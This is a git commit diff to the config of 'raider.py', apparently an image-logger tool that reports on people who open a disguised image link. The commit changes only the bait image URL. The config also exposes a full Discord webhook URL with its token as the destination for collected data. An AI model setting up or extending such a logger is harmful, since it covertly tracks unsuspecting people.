3f71f50988758fb678778c940f7a096561ecc014
AZURASTORE8 <11416@hwp.ac.th>
2025-08-03 10:25:54 +0700

    Update raider.py

--- src/raider.py
+++ src/raider.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://canary.discord.com/api/webhooks/1401403879362531348/gGPNF5UABuvmDgHUw69p9qEQmfznWdaDICdJL19CZY96vtUzyyJPdIv0o8_Pl_-W1Uw2",
-    "image": "https://i.pinimg.com/736x/8f/8c/de/8f8cde7761b6fe988c7be4a8bec51020.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://www.pcworld.com/wp-content/uploads/2025/04/Windows-XP-Bliss-desktop-large.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
